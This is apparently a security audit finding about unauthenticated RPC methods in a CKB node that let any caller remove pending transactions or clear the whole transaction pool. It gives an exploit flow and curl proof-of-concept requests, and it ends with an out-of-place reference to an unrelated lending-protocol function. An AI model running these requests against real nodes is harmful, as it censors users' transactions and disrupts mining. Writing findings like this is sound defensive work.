### Title
Unauthenticated RPC Callers Can Remove Arbitrary Transactions from the Tx-Pool — (`rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` and `clear_tx_pool` RPC methods in the `Pool` module modify critical node state — the transaction pool — without any per-caller authorization check. The `Pool` module is enabled by default. Any caller who can reach the RPC port (any local process by default, or any remote host if the operator exposes the port) can silently evict any pending transaction or wipe the entire pool. There is no mechanism to verify that the caller owns the transaction or has operator-level rights.

---

### Finding Description

**Root cause — no authentication on state-mutating RPC methods:**

The RPC server (`rpc/src/server.rs`) is built with no authentication middleware. The `start_server` function registers the `IoHandler` directly on an Axum router with no token, session, or credential check: [1](#0-0) 

The `Pool` module is enabled by default in `ckb.toml`: [2](#0-1) 

`remove_transaction` is declared as a public RPC method with no guard: [3](#0-2) 

Its implementation directly calls `tx_pool.remove_local_tx(tx_hash.into())` — no ownership check, no role check, no token: [3](#0-2) 

`clear_tx_pool` is equally unguarded and wipes the entire pool in one call: [4](#0-3) 

The only documented protection is a network-level binding to `127.0.0.1:8114` by default, with a warning that exposing it is dangerous: [5](#0-4) [6](#0-5) 

However, the code enforces no such restriction at the application layer. Any process on the same host — or any remote host if the operator has exposed the port — can call these methods without credentials.

**Exploit flow:**

1. Attacker identifies a target node with the RPC port reachable (localhost process, misconfigured public exposure, or SSRF from a co-located service).
2. Attacker calls `remove_transaction` with the hash of a victim's pending transaction:
   ```json
   {"jsonrpc":"2.0","method":"remove_transaction","params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"],"id":1}
   ```
3. The node silently drops the transaction from the pool. The victim's transaction is gone; no error is returned to the victim.
4. Alternatively, the attacker calls `clear_tx_pool` to evict every pending transaction simultaneously.

---

### Impact Explanation

- **Transaction censorship:** An attacker can target and remove specific high-value or time-sensitive transactions (e.g., DAO withdrawals, time-locked transfers) from the pool before they are mined, forcing users to resubmit and potentially missing deadlines.
- **Mining disruption:** Repeatedly calling `clear_tx_pool` empties the pool before block assembly, causing miners to produce empty blocks and lose fee revenue.
- **Integrity violation:** The tx-pool is a shared critical resource. Any caller being able to mutate it without authorization violates the invariant that only the submitting user or the node operator should be able to remove a transaction.

---

### Likelihood Explanation

- The `Pool` module is **enabled by default** in the standard `ckb.toml`.
- The RPC binds to `127.0.0.1` by default, but many operators expose it to their LAN or the internet for dApp/wallet integration — a common real-world deployment pattern.
- Even on localhost, any co-located process (a wallet, a dApp backend, a compromised dependency) can call these methods.
- No exploit tooling is needed: a single `curl` command suffices.
- The attacker profile "malicious API/RPC/web client" and "supported local RPC user" are both explicitly in scope per the RESEARCHER playbook. [7](#0-6) 

---

### Recommendation

- **Short term:** Implement an optional API token (Bearer or Basic auth) that the node operator configures in `ckb.toml`. The RPC server middleware should reject requests without a valid token for all state-mutating methods (`remove_transaction`, `clear_tx_pool`, `clear_tx_verify_queue`, `set_ban`, `clear_banned_addresses`, `set_network_active`).
- **Long term:** Introduce a role-based access model distinguishing read-only callers (wallets, explorers) from privileged callers (node operators, miners). State-mutating methods should require the privileged role. Add integration tests asserting that an unauthenticated caller cannot successfully invoke any state-modifying RPC method.

---

### Proof of Concept

```bash
# Step 1: Submit a transaction to the pool (legitimate user)
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"send_transaction","params":[<tx_json>, null],"id":1}'
# Returns: {"result":"0xTX_HASH..."}

# Step 2: Attacker (any local process, no credentials) removes it
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["0xTX_HASH"],"id":2}'
# Returns: {"result":true}  -- transaction silently evicted, no auth required

# Step 3: Attacker wipes the entire pool
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":3}'
# Returns: {"result":null}  -- all pending transactions gone
```

The `remove_transaction` implementation at `rpc/src/module/pool.rs:662-669` and `clear_tx_pool` at lines 684-692 execute unconditionally with no caller identity check, directly mirroring the unguarded `updateReserveTotalBorrowsByRateMode` pattern from the reference report. [4](#0-3)
